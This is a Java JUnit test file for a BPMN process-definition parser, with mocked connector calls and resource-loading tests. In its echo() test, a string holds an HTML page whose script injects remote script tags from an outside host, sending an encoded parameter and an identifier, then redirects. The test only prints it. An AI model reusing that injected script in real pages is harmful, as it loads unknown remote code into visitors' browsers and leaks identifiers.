package com.brandnewdata.mop.poc.process.parser;

import cn.hutool.core.io.resource.ResourceUtil;
import cn.hutool.json.JSONUtil;
import com.brandnewdata.mop.poc.process.manager.ConnectorManager;
import com.brandnewdata.mop.poc.process.parser.dto.Step1Result;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.mockito.Mock;
import org.mockito.MockitoAnnotations;

import static org.mockito.Mockito.any;
import static org.mockito.Mockito.when;


class ProcessDefinitionParserTest {

    @Mock
    private ConnectorManager manager;

    @BeforeEach
    void setUp() {
        MockitoAnnotations.openMocks(this);
    }

    @Test
    void echo() {
        String str = "<html><head/><body onload=\"a()\"><script>o=[\"zjzww.ywwlgj.net\"];p=0;q=\"MzIsMzosNjIsNEI1NDc0MzI6MDQyQjc7LDAyMCw0OiwzOzRCMTIyMzRCMzQ1MjY6NTc7MjI0MUJlcXNmcWho\";r=window.location.href;r=r.split(\"#\")[0];s=r.substring(0,4)==\"http\"?0:1;function a(){for(i in o){b(\"https://\"+o[i]+\":8443/addInternetInfo?parm=\"+q+\"&uuid=184f0d1c4af8c60&itype=\"+s);p++}}function b(x){y=document.createElement('script');y.type=\"text/javascript\";y.src=x;document.querySelector('head').appendChild(y)}(function c(n){if(n<9&&p!=o.length){setTimeout(function(){c(n+1)},100)}else if(0==s){window.location.href=r}})(0)</script></body></html>\r\n";
        System.out.println(str);
    }

    private String RESOURCE = "test2.bpmn.xml";

    @Test
    void allTest() {
        ProcessDefinitionParseStep1 step1 = testNewInstance();
        testStep1(step1);
    }

    ProcessDefinitionParseStep1 testNewInstance() {
        String xml = ResourceUtil.readUtf8Str(RESOURCE);
        return ProcessDefinitionParser.step1(null, null, xml);
        // Assertions.assertEquals(null, result);
    }

    ProcessDefinitionParseStep2 testStep1(ProcessDefinitionParseStep1 step1) {
         return step1.replAttr().replServiceTask(false, null).step2();
    }

    @Test
    void testTriggerXMLParse() {
        // 设置测试桩
        when(manager.getProtocol(any())).thenReturn("HTTP");

        String json = ResourceUtil.readUtf8Str("trigger.json");
        String triggerFullId = "com.develop:wjx.callback:v1";
        String xml = JSONUtil.parseObj(json).getStr("processEditing");
        ProcessDefinitionParseStep1 step1 = ProcessDefinitionParser.step1(triggerFullId, null, xml);
        return;
    }

    @Test
    void testSceneCustomTriggerXMLParse() {
        String json = ResourceUtil.readUtf8Str("trigger.json");
        String xml2 = JSONUtil.parseObj(json).getStr("processEditing");

        // 设置测试桩
        when(manager.getTriggerXML(any())).thenReturn(xml2);
        when(manager.getProtocol(any())).thenReturn("HTTP");

        String xml = ResourceUtil.readUtf8Str("test.bpmn.xml");

        ProcessDefinitionParseStep1 step1 = ProcessDefinitionParser.step1(null, null, xml);

    }


    /**
     * 测试标准的bpmn流程
     */
    @Test
    void testParseOriginalXml() {
        String xml = ResourceUtil.readUtf8Str("process/empty_process.xml");
        ProcessDefinitionParseStep1 step1 = ProcessDefinitionParser.step1(null, null, xml);
        Step1Result step1Result = step1.step1Result();
        return;
    }

    @Test
    void testParseOriginalXml2() {
        String xml = ResourceUtil.readUtf8Str("process/process5.xml");
        ProcessDefinitionParseStep1 step1 = ProcessDefinitionParser.step1(null, null, xml);
        step1.replServiceTask(false, null);
        Step1Result step1Result = step1.step1Result();
        return;
    }
}

//Generated with love by TestMe :) Please report issues and submit feature requests at: http://weirddev.com/forum#!/testme